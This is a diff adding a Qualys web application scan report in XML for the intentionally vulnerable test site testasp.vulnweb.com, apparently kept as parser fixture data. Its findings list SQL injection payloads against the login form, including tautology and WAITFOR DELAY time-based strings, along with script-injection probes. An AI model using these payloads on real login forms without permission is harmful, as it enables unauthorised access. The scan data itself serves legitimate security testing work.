@@ -1,0 +1,1731 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<WasScan xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://qualysapi.qualys.com/qps">
+  <id>5622196</id>
+  <name><![CDATA[Web Application Vulnerability Scan - http://testasp.vulnweb.com/ - 2014-06-23]]></name>
+  <reference>was/1403548733769.5377050</reference>
+  <type>VULNERABILITY</type>
+  <mode>ONDEMAND</mode>
+  <multi>false</multi>
+  <target>
+    <webApp>
+      <id>43465229</id>
+      <name><![CDATA[http://testasp.vulnweb.com/]]></name>
+      <url><![CDATA[http://testasp.vulnweb.com/]]></url>
+    </webApp>
+    <scannerAppliance>
+      <type>EXTERNAL</type>
+    </scannerAppliance>
+  </target>
+  <profile>
+    <id>52237</id>
+    <name><![CDATA[Initial WAS Options]]></name>
+  </profile>
+  <options>
+    <count>12</count>
+    <list>
+      <WasScanOption>
+        <name>Detection Scope</name>
+        <value><![CDATA[COMPLETE]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Web Application Authentication Record Name</name>
+        <value><![CDATA[None]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Scanner Appliance</name>
+        <value><![CDATA[External (IP: 64.39.106.124, Scanner: 7.7.28-1, WAS: 3.6.35-1, Signatures: 2.2.752-2)]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Target URL</name>
+        <value><![CDATA[http://testasp.vulnweb.com/]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Performance Settings</name>
+        <value><![CDATA[MEDIUM]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Sensitive Content: Social Security Numbers (US)</name>
+        <value><![CDATA[false]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Sensitive Content: Credit Card Numbers</name>
+        <value><![CDATA[false]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Maximum Crawling Links</name>
+        <value><![CDATA[300]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Bruteforce Settings</name>
+        <value><![CDATA[MINIMAL]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Option Profile Name</name>
+        <value><![CDATA[Initial WAS Options]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Crawling Form Submissions</name>
+        <value><![CDATA[BOTH]]></value>
+      </WasScanOption>
+      <WasScanOption>
+        <name>Web Application Name</name>
+        <value><![CDATA[http://testasp.vulnweb.com/]]></value>
+      </WasScanOption>
+    </list>
+  </options>
+  <launchedDate>2014-06-23T18:38:53Z</launchedDate>
+  <launchedBy>
+    <id>370601</id>
+    <username>denmg_dc</username>
+    <firstName><![CDATA[Dan]]></firstName>
+    <lastName><![CDATA[Cornell]]></lastName>
+  </launchedBy>
+  <status>FINISHED</status>
+  <endScanDate>2014-06-23T19:05:59Z</endScanDate>
+  <scanDuration>1626</scanDuration>
+  <summary>
+    <crawlDuration>179</crawlDuration>
+    <testDuration>1318</testDuration>
+    <linksCrawled>56</linksCrawled>
+    <nbRequests>6093</nbRequests>
+    <resultsStatus>SUCCESSFUL</resultsStatus>
+    <authStatus>NONE</authStatus>
+    <os>Windows 2003/XP</os>
+  </summary>
+  <stats>
+    <global>
+      <nbVulnsTotal>47</nbVulnsTotal>
+      <nbVulnsLevel5>15</nbVulnsLevel5>
+      <nbVulnsLevel4>0</nbVulnsLevel4>
+      <nbVulnsLevel3>19</nbVulnsLevel3>
+      <nbVulnsLevel2>5</nbVulnsLevel2>
+      <nbVulnsLevel1>8</nbVulnsLevel1>
+      <nbScsTotal>0</nbScsTotal>
+      <nbScsLevel5>0</nbScsLevel5>
+      <nbScsLevel4>0</nbScsLevel4>
+      <nbScsLevel3>0</nbScsLevel3>
+      <nbScsLevel2>0</nbScsLevel2>
+      <nbScsLevel1>0</nbScsLevel1>
+      <nbIgsTotal>12</nbIgsTotal>
+      <nbIgsLevel5>0</nbIgsLevel5>
+      <nbIgsLevel4>0</nbIgsLevel4>
+      <nbIgsLevel3>2</nbIgsLevel3>
+      <nbIgsLevel2>1</nbIgsLevel2>
+      <nbIgsLevel1>9</nbIgsLevel1>
+    </global>
+    <byGroup>
+      <count>4</count>
+      <list>
+        <GroupStat>
+          <group>PATH</group>
+          <nbTotal>2</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>1</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </GroupStat>
+        <GroupStat>
+          <group>INFO</group>
+          <nbTotal>29</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>18</nbLevel3>
+          <nbLevel2>4</nbLevel2>
+          <nbLevel1>7</nbLevel1>
+        </GroupStat>
+        <GroupStat>
+          <group>XSS</group>
+          <nbTotal>4</nbTotal>
+          <nbLevel5>3</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>1</nbLevel1>
+        </GroupStat>
+        <GroupStat>
+          <group>SQL</group>
+          <nbTotal>12</nbTotal>
+          <nbLevel5>12</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </GroupStat>
+      </list>
+    </byGroup>
+    <byOwasp>
+      <count>7</count>
+      <list>
+        <OwaspStat>
+          <owasp>OWASP-A7</owasp>
+          <nbTotal>1</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </OwaspStat>
+        <OwaspStat>
+          <owasp>OWASP-A6</owasp>
+          <nbTotal>2</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>1</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </OwaspStat>
+        <OwaspStat>
+          <owasp>OWASP-A5</owasp>
+          <nbTotal>12</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>10</nbLevel3>
+          <nbLevel2>2</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </OwaspStat>
+        <OwaspStat>
+          <owasp>OWASP-A4</owasp>
+          <nbTotal>2</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>1</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </OwaspStat>
+        <OwaspStat>
+          <owasp>OWASP-A3</owasp>
+          <nbTotal>4</nbTotal>
+          <nbLevel5>3</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>1</nbLevel1>
+        </OwaspStat>
+        <OwaspStat>
+          <owasp>OWASP-A2</owasp>
+          <nbTotal>3</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>1</nbLevel3>
+          <nbLevel2>2</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </OwaspStat>
+        <OwaspStat>
+          <owasp>OWASP-A1</owasp>
+          <nbTotal>12</nbTotal>
+          <nbLevel5>12</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </OwaspStat>
+      </list>
+    </byOwasp>
+    <byWasc>
+      <count>8</count>
+      <list>
+        <WascStat>
+          <wasc>WASC-13</wasc>
+          <nbTotal>1</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>1</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-20</wasc>
+          <nbTotal>1</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>1</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-15</wasc>
+          <nbTotal>10</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>9</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-17</wasc>
+          <nbTotal>1</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-19</wasc>
+          <nbTotal>12</nbTotal>
+          <nbLevel5>12</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-16</wasc>
+          <nbTotal>1</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>1</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-2</wasc>
+          <nbTotal>1</nbTotal>
+          <nbLevel5>0</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>1</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+        <WascStat>
+          <wasc>WASC-8</wasc>
+          <nbTotal>3</nbTotal>
+          <nbLevel5>3</nbLevel5>
+          <nbLevel4>0</nbLevel4>
+          <nbLevel3>0</nbLevel3>
+          <nbLevel2>0</nbLevel2>
+          <nbLevel1>0</nbLevel1>
+        </WascStat>
+      </list>
+    </byWasc>
+  </stats>
+  <vulns>
+    <count>47</count>
+    <list>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Default.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Default.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUPass</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>3</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfUPass=password'%20OR%20't'%3D't]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMzAyCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmVVBhc3M9cGFzc3dvcmQnJTIwT1IlMjAndCclM0QndAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgoKQk9EWQp0ZlVOYW1lPUpvaG4mdGZVUGFzcz1wYXNzd29yZCclMjBBTkQlMjAneCclM0QndA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfUPass=password'%20OR%203%3D3--%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMzAyCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmVVBhc3M9cGFzc3dvcmQnJTIwT1IlMjAzJTNEMy0tJTIwCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9Mb2dpbi5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCgpCT0RZCnRmVU5hbWU9Sm9obiZ0ZlVQYXNzPXBhc3N3b3JkJyUyMEFORCUyMDMlM0Q0LS0lMjA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[%27;WAITFOR%20DELAY%20%27@DELAY_HMS@%27--%20]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogKFRpbWVzIGFyZSBleHByZXNzZWQgaW4gbWlsbGlzZWNvbmRzLikKRXhwZWN0ZWQgcmVzcG9uc2UgZGVsYXk6IDI4MTg0Ck9ic2VydmVkIHJlc3BvbnNlIGRlbGF5OiAyODE3OQpNZWFuIHJlc3BvbnNlIHRpbWU6IDE4NApTdGFuZGFyZCBkZXZpYXRpb246IDEwNApOdW1iZXIgb2Ygc3RkZGV2IGZyb20gbWVhbjogMjY4LjEzMTA1MQoKVGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRpbWUtYmFzZWQgaW5mZXJlbmNlIHRoYXQgY29tcGFyZWQgdGhlIGF2ZXJhZ2UgcmVzcG9uc2UgdGltZSBvZiBhIHBhZ2UgdG8gaXRzIHJlc3BvbnNlIHRpbWUgd2l0aCBhbiBpbmplY3RlZCBwYXlsb2FkLiBUaGlzIHZ1bG5lcmFiaWxpdHkgaXMgY29uZmlybWVkIGJhc2VkIG9uIHRpbWluZyByYXRoZXIgdGhhbiB0aGUgY29udGVudCBvZiB0aGUgcmVzcG9uc2UuCg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>3</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[%27;WAITFOR%20DELAY%20%27@DELAY_HMS@%27--%20]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogKFRpbWVzIGFyZSBleHByZXNzZWQgaW4gbWlsbGlzZWNvbmRzLikKRXhwZWN0ZWQgcmVzcG9uc2UgZGVsYXk6IDI4MTg0Ck9ic2VydmVkIHJlc3BvbnNlIGRlbGF5OiAyODE3OQpNZWFuIHJlc3BvbnNlIHRpbWU6IDE4NApTdGFuZGFyZCBkZXZpYXRpb246IDEwNApOdW1iZXIgb2Ygc3RkZGV2IGZyb20gbWVhbjogMjY4LjEzMTA1MQoKVGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRpbWUtYmFzZWQgaW5mZXJlbmNlIHRoYXQgY29tcGFyZWQgdGhlIGF2ZXJhZ2UgcmVzcG9uc2UgdGltZSBvZiBhIHBhZ2UgdG8gaXRzIHJlc3BvbnNlIHRpbWUgd2l0aCBhbiBpbmplY3RlZCBwYXlsb2FkLiBUaGlzIHZ1bG5lcmFiaWxpdHkgaXMgY29uZmlybWVkIGJhc2VkIG9uIHRpbWluZyByYXRoZXIgdGhhbiB0aGUgY29udGVudCBvZiB0aGUgcmVzcG9uc2UuCg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John'%20OR%203%3D3--%20&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMzAyCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJyUyME9SJTIwMyUzRDMtLSUyMCZ0ZlVQYXNzPXBhc3N3b3JkCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9Mb2dpbi5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCgpCT0RZCnRmVU5hbWU9Sm9obiclMjBBTkQlMjAzJTNENC0tJTIwJnRmVVBhc3M9cGFzc3dvcmQ]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John'%20OR%20't'%3D't&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvZGVzLgoKVHJ1ZSByZXNwb25zZSBzdGF0dXMgY29kZTogMzAyCiBGYWxzZSByZXNwb25zZSBzdGF0dXMgY29kZTogMjAwCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJyUyME9SJTIwJ3QnJTNEJ3QmdGZVUGFzcz1wYXNzd29yZAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgoKQk9EWQp0ZlVOYW1lPUpvaG4nJTIwQU5EJTIwJ3gnJTNEJ3QmdGZVUGFzcz1wYXNzd29yZA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUPass</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><<SCRIPT%20a=2>qss=7;//<</SCRIPT>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[';(function()%7bqxss%7d);//]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTeW50YXggZXJyb3IsIHBlcm1pc3Npb24gdmlvbGF0aW9uLCBvciBvdGhlciBub25zcGVjaWZpYyBlcnJvciZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20%60%3b!--=%26%7b()%7d>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20a=@REQUESTID@>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[';(function()%7bqxss%7d);//]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTeW50YXggZXJyb3IsIHBlcm1pc3Npb24gdmlvbGF0aW9uLCBvciBvdGhlciBub25zcGVjaWZpYyBlcnJvciZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20%60%3b!--=%26%7b()%7d>]]></payload>
